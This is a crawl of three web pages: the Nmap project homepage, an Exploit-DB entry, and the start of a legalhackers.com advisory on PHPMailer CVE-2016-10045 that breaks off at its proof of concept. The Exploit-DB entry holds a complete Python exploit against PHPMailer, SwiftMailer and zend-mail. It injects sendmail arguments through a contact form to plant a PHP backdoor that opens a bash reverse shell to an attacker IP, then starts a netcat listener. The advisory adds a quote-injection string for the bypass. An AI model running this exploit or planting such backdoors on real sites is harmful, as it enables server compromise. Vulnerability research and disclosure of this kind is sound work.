interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.exploit-db.com_0d2f2e33_20250125_054108.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework / zend-mail < 2.4.11 - 'AIO' 'PwnScriptum' Remote Code Execution

#### EDB-ID:

###### 40986

#### CVE:

###### [2016-10074](https://nvd.nist.gov/vuln/detail/CVE-2016-10074) [2016-10045](https://nvd.nist.gov/vuln/detail/CVE-2016-10045) [2016-10034](https://nvd.nist.gov/vuln/detail/CVE-2016-10034) [2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

**EDB Verified:**

#### Author:

###### [Dawid Golunski](/?author=1951)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2017-01-02

---

**Vulnerable App:**

```
#!/usr/bin/python

intro = """\033[94m
    __                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/

PHPMailer / Zend-mail / SwiftMailer - Remote Code Execution Exploit
		     a.k.a "PwnScriptum"

 CVE-2016-10033 + CVE-2016-10045 + CVE-2016-10034 + CVE-2016-10074

This PoC exploit aims to execute a reverse shell on the target in
the context of the web-server user via vulnerable PHP email library.

Discovered and Coded by:

\033[1;34m
 Dawid Golunski
 https://legalhackers.com

 t: @dawid_golunski for updates
\033[0m
\033[94m
P.$. For testing only! Don't break the Web ;)
\033[0m
"""
info = """
[Version]
Limited (ver. 1.0)

[PoC Video]
See the the exploit in action at:

https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html

[Info]
This exploit targets a common webapp component - Contact Form.

It combines payloads for the following vulns:

1. PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

2. PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045 / escapeshell bypass)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln.html

3. SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html

4. Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html

[Usage]

./PwnScriptum_RCE_exploit.py [-h] -url WEBAPP_BASE_URL -cf CONTACT_SCRIPT
                                  [-d TARGET_UP_DIR] -ip ATTACKERS_IP
                                  [-p ATTACKERS_PORT] [--version]
                                  [--post-action POST_ACTION]
                                  [--post-name POST_NAME]
                                  [--post-email POST_EMAIL]
                                  [--post-msg POST_MSG]

Note, make sure the contact form matches the default field names (send/name/email/msg).
Otherwise override with --post-msg=message_box for example.

"""

import os
import argparse
import time
import urllib
import urllib2
import socket
import sys

# The Main Meat
print intro

# Show info
if '-H' in sys.argv:
	print info
	exit(0)
# Parse input args
parser = argparse.ArgumentParser(prog='PwnScriptum_RCE_exploit.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit (a.k.a \'PwnScriptum\')\nDiscovered by Dawid Golunski (https://legalhackers.com)')
parser.add_argument('-H', action='store_true', default="false", required=False,    help='Full Help / Info Page')
parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True,  help='WebApp Base Url')
parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True,  help='Contact Form scriptname')
parser.add_argument('-d' ,  dest='TARGET_UP_DIR',   required=False, help='Target Upload Dir')
parser.add_argument('-ip',  dest='ATTACKERS_IP',    required=True,  help='Attackers Public IP for RevShell')
parser.add_argument('-p',   dest='ATTACKERS_PORT',  required=False, help='Attackers Port for RevShell listener')
parser.add_argument('--version', action='version', version='%(prog)s 1.0 Limited edition')
parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST "action" field name',         default="send")
parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST "email" field name',          default="email")
parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST "message" field name',        default="msg")
args = parser.parse_args()

# Preset vars
TMOUT = 3
# Set Vars
if args.ATTACKERS_PORT is None:
	args.ATTACKERS_PORT = 8080
if args.TARGET_UP_DIR  is None:
	args.TARGET_UP_DIR = "upload"
# Build the target backdoor URL here (note the "random" pid bit to avoid php code collisions on multiple runs / multiple phpfile appends ;)
BACKDOOR_FILE = 'phpbackdoor' + str(os.getpid()) + '.php'
BACKDOOR_URL  = args.WEBAPP_BASE_URL + '/' + args.TARGET_UP_DIR + '/' + BACKDOOR_FILE
CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT

# Show params
print """[+] Setting vars to: \n
WEBAPP_BASE_URL     = [%s]
CONTACT_SCRIPT      = [%s]
TARGET_UP_DIR       = [%s]
ATTACKERS_IP        = [%s]
ATTACKERS_PORT      = [%s]
CONTACT_SCRIPT_URL  = [%s]
BACKDOOR_FILEl      = [%s]
""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.TARGET_UP_DIR, args.ATTACKERS_IP, args.ATTACKERS_PORT, CONTACT_SCRIPT_URL, BACKDOOR_FILE)

print "[+] Choose your target / payload: "
print "\033[1;34m"
print """[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)\n"""
print """[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)
	        The escapeshellarg() bypass :)\n"""
print """[3] SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)\n"""
print """[4] Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"""
print "\033[0m"

try:
    target = int(raw_input('[?] Select target [1-2]: '))
except ValueError:
    print "Not a valid choice. Exiting\n"
    exit(2)
if (target>4):
    print "No such target. Exiting\n"
    exit(3)
if target == 1:
	# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
	payload = '"attacker\\" -oQ/tmp/ -X%s/%s some"@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 2:
	# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
	payload = "\"attacker\\' -oQ/tmp/ -X%s/%s  some\"@email.com" % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 3:
	# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
        payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 4:
	# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
        payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)

print "\n[+] Generated mail() payload will upload the backdoor into the '%s' dir\n" % args.TARGET_UP_DIR
# PHP RCE code to be saved into the backdoor php file on the target in TARGET_UP_DIR. E.g:
# e.g:
#RCE_PHP_CODE = "<?php phpinfo(); ?>"
RCE_PHP_CODE = """<?php sleep(%d); system("/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1' ");  ?>""" % (TMOUT, args.ATTACKERS_IP, args.ATTACKERS_PORT)

# The form names might need to be adjusted
post_fields = {'action': "%s" % args.POST_ACTION, "%s" % args.POST_NAME: 'Jas Fasola', "%s" % args.POST_EMAIL: payload, "%s" % args.POST_MSG: RCE_PHP_CODE}

# Attack
# Inject payload into PHPMailer / mail() via a Contact form. This should write out the backdoor
print "[+] Backdoor upload via the contact form at '%s'\n" % CONTACT_SCRIPT_URL
data = urllib.urlencode(post_fields)
req = urllib2.Request(CONTACT_SCRIPT_URL, data)
response = urllib2.urlopen(req)
the_page = response.read()

# Check if the backdoor was uploaded correctly.
# A little trick here. The urlopen should timeout at sleep(X)-1 if the backdoor ran fine
# So we catch the timeout to find out.

# Is it uploaded ? Try to execute the PHP backdoor and the Reverse Shell within it
print "[+] Checking for the backdoor at the URL '%s'\n" % BACKDOOR_URL
got_timeout = 0
http_err = 0
try:
    urllib2.urlopen(BACKDOOR_URL, timeout = (TMOUT-1))
except urllib2.HTTPError as e:
    http_err = e.code
except socket.timeout as e:
    print "[*] \033[1;32mLooking good!\033[0m The sleep() worked by the looks of it :) \nUrlopen timed out just in time for the shell :)\n"
    got_timeout = 1

if (got_timeout != 1):
    print "[!] Something went wrong... Got error: [%d] \nTry another dir? Push through, don't give up! :)\n" % http_err
    exit(2)

# Spawn the shell and wait for the sleep() PHP call to finish before /bin/bash is called
print "[+] We should get a shell if we got till here! Spawning netcat now! :)\n"
print "[+] \033[1;34mPlease tell me you're seeing this too... ;)\033[0m\n"
os.system("nc -v -l -p %d" % args.ATTACKERS_PORT)

print "\n[+] Shell closed\n"

print "\033[1;34mP.$. There's more to it :) Exiting, for now...\033[0m\n"

```

**Tags:**

**Advisory/Source:**
[Link](https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from legalhackers.com_ce4c8127_20250126_062513.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10045
- Release date: 27.12.2016
- Last revision: 28.12.2016
- Revision 3.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

PHPMailer < 5.2.20 Remote Code Execution (0day Patch Bypass/exploit)

II. BACKGROUND
-------------------------

"PHPMailer continues to be the world's most popular transport class, with an
estimated 9 million users worldwide. Downloads continue at a significant
pace daily."

<http://phpmailer.worxware.com/>

"Probably the world's most popular code for sending email from PHP!
Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,
Joomla! and many more"

<https://github.com/PHPMailer/PHPMailer>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in PHPMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.

The first patch of the vulnerability CVE-2016-10033 was incomplete.
This advisory demonstrates the bypass of the patch.
The bypass allows to carry out Remote Code Execution on all current
versions (including 5.2.19).

NOTE:
The vulnerability / patch bypass was responsibly reported to the vendor
in private on December 26th and a new CVE was issued by MITRE on the same day.
However a potential bypass was publicly discussed on the oss-sec list.
Holding the advisory further would serve no purpose which is what triggered
the earlier release of this advisory.

IV. DESCRIPTION
-------------------------

The patch for CVE-2016-10033 vulnerability added in PHPMailer 5.2.17
sanitizes the $Sender variable by applying escapeshellarg() escaping
before the value is passed to mail() function.

It does not however take into account the clashing of the
escapeshellarg() function with internal escaping with escapeshellcmd()
performed by mail() function on the 5th parameter.

As a result it is possible to inject an extra quote that does not get
properly escaped and break out of the escapeshellarg() protection
applied by the patch in PHPMailer 5.2.17.

For example:

$mail->SetFrom("\"Attacker\\' -Param2 -Param3\"@test.com", 'Client Name');

will result in the followig list of arguments passed to sendmail program:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-f\"Attacker\\\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com']

An attacker could pass the -X parameter of sendmail to write out a
log file with arbitrary PHP code.

This makes the current latest 5.2.19 and 5.2.18 versions of PHPMailer
vulnerable to Remote Code Execution despite the patch.

A working PoC is presented below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

#!/usr/bin/python

#PHPMailer_RCE_exploit.pl

intro = """
PHPMailer RCE PoC Exploits

PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)

